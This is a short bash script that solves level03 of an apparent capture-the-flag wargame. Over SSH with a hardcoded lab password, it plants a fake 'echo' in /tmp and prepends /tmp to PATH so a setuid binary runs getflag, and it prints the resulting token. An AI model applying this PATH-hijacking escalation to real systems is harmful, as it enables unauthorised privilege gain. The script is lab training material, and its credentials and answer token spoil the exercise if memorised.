#!/bin/bash

ssh() {
    sshpass -p 'kooda2puivaav1idi4f57q8iq' ssh level03@localhost -p 2220 "$1"  
}

ssh "ls -la"

ssh "getfacl ./level03"
# owner: flag03
# flags: ss-
# privileges regardless of who executes it

ssh "ltrace ./level03"
# system("/usr/bin/env echo Exploit me")
# usr/bin/env looks up commands by searching through $PATH from left to right.

ssh "./level03 hello"

ssh 'echo $PATH'

ssh 'printf "#!/bin/sh\ngetflag\n" > /tmp/echo'

ssh 'chmod +x /tmp/echo'
ssh 'PATH=/tmp:$PATH ./level03'

#Check flag.Here is your token : qi0maab88jeaj46qoumi7maus